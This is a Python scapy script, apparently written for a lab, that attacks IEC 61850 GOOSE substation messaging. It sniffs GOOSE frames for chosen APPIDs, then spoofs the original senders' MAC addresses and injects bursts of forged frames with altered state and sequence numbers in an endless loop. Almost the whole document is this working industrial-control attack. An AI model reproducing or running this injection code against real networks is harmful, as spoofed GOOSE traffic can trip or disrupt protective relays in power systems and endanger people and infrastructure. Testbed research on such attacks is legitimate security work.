import time
import struct
import random
from scapy.all import *

# --- LAB CONFIGURATION ---
INTERFACE = "Ethernet"
TARGET_APPIDS = [0x0003, 0x0004, 0x0006]
BURST_SIZE = 4       # Packets per burst
STAGGER_DELAY = 33.3  # Seconds between different APPID bursts
VLAN_PRIORITY = 0
VLAN_ID = 0

MY_MAC = get_if_hwaddr(INTERFACE)

def decode_ber_len(data, offset):
    first_byte = data[offset]
    if first_byte < 0x80:
        return first_byte, 1
    n = first_byte & 0x7f
    return int.from_bytes(data[offset + 1 : offset + 1 + n], 'big'), n + 1

def encode_ber_int(tag, value):
    v_len = (value.bit_length() // 8) + 1
    val_bytes = value.to_bytes(v_len, 'big')
    if len(val_bytes) > 1 and val_bytes[0] == 0x00 and not (val_bytes[1] & 0x80):
        val_bytes = val_bytes[1:]
    return bytes([tag, len(val_bytes)]) + val_bytes

def get_goose_map(pdu):
    mapping = {}
    if len(pdu) < 10 or pdu[8] != 0x61:
        return None
    apdu_len, len_size = decode_ber_len(pdu, 9)
    ptr = 9 + len_size
    end_of_apdu = ptr + apdu_len
    while ptr < end_of_apdu:
        tag = pdu[ptr]
        try:
            v_len, l_size = decode_ber_len(pdu, ptr + 1)
        except: break
        if tag in [0x85, 0x86]:
            mapping[tag] = {'offset': ptr, 'full_len': 1 + l_size + v_len}
        if tag == 0xab: break 
        ptr += 1 + l_size + v_len
    return mapping if (0x85 in mapping and 0x86 in mapping) else None

def patch_pdu_lengths(pdu):
    raw_pdu = bytearray(pdu)
    total_len = len(raw_pdu)
    raw_pdu[2:4] = struct.pack("!H", total_len)
    if raw_pdu[9] == 0x81:
        raw_pdu[10] = total_len - 11
    elif raw_pdu[9] == 0x82:
        raw_pdu[10:12] = struct.pack("!H", total_len - 12)
    else:
        raw_pdu[9] = total_len - 10
    return bytes(raw_pdu)

def execute_staggered_attack():
    fingerprints = {}
    print(f"[*] Phase 1: Blueprinting {len(TARGET_APPIDS)} targets on {INTERFACE}...")

    # Capture templates for all APPIDs
    while len(fingerprints) < len(TARGET_APPIDS):
        pkt = sniff(iface=INTERFACE, count=1, filter="ether proto 0x88b8")[0]
        if pkt.src == MY_MAC: continue
        
        # Calculate PDU offset
        raw_pkt = raw(pkt)
        pdu_offset = 18 if pkt.haslayer(Dot1Q) else 14
        appid = struct.unpack("!H", raw_pkt[pdu_offset : pdu_offset + 2])[0]

        if appid in TARGET_APPIDS and appid not in fingerprints:
            pdu = raw_pkt[pdu_offset:]
            mapping = get_goose_map(pdu)
            if mapping:
                fingerprints[appid] = {
                    'header': raw(Ether(src=pkt.src, dst=pkt.dst)/Dot1Q(prio=VLAN_PRIORITY, vlan=VLAN_ID, type=0x88b8)),
                    'pdu': pdu,
                    'map': mapping
                }
                print(f"[+] Locked APPID {hex(appid)} from {pkt.src}")

    send_sock = conf.L2socket(iface=INTERFACE)
    print(f"\n[!] Phase 2: Starting Sequential Burst (80s Window)")

    try:
        while True:
            for aid in TARGET_APPIDS:
                fp = fingerprints[aid]
                cur_st = random.randint(1, 500)
                cur_sq_base = random.randint(1, 500)
                
                print(f"[*] Bursting {hex(aid)} (stNum={cur_st})")
                
                for i in range(BURST_SIZE):
                    st_tlv = encode_ber_int(0x85, cur_st)
                    sq_tlv = encode_ber_int(0x86, cur_sq_base + i)
                    
                    m85, m86 = fp['map'][0x85], fp['map'][0x86]
                    orig = fp['pdu']
                    
                    # Surgical Splicing
                    new_pdu = (orig[:m85['offset']] + st_tlv + 
                               orig[m85['offset'] + m85['full_len'] : m86['offset']] + 
                               sq_tlv + 
                               orig[m86['offset'] + m86['full_len'] :])
                    
                    send_sock.send(fp['header'] + patch_pdu_lengths(new_pdu))
                    #time.sleep(0.002) # Ultra-fast hardware-style burst
                
                print(f"[+] Burst complete. Staggering for {STAGGER_DELAY}s...")
                time.sleep(STAGGER_DELAY)
                
    except KeyboardInterrupt:
        print("\n[*] Shutdown.")

if __name__ == "__main__":
    execute_staggered_attack()